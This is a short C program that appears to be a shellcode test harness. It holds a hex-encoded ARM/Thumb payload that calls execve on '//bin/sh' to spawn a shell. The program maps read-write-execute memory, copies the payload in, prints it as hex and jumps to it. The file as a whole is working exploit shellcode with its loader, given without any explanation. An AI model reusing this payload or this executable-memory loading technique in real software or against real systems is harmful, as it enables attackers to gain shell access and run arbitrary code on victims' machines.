#include <stdio.h>
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>


unsigned char SC[] =  "\x01\x60\x8f\xe2"
        "\x16\xff\x2f\xe1"
        "\x78\x46"
        "\x12\x30"
        "\x01\x1e"
        "\x52\x40"
        "\x8a\x60"
        "\x01\x90"
        "\x02\x92"
        "\x01\xa9"
        "\x52\x40"
        "\x0b\x27"
        "\x01\xdf"
        "\x2f\x2f"
        "\x62\x69"
        "\x6e\x2f"
        "\x73\x68iiii";

int main(void)
{
    void *ptr = mmap(0, sizeof(SC),PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    memcpy(ptr, SC, sizeof(SC));
    for (int i = 0; i < sizeof(SC); i++)
    {
        printf("%02x", SC[i]);
    }   
    printf("\n");

    (*(void(*)()) ptr)();
    return 0;

}
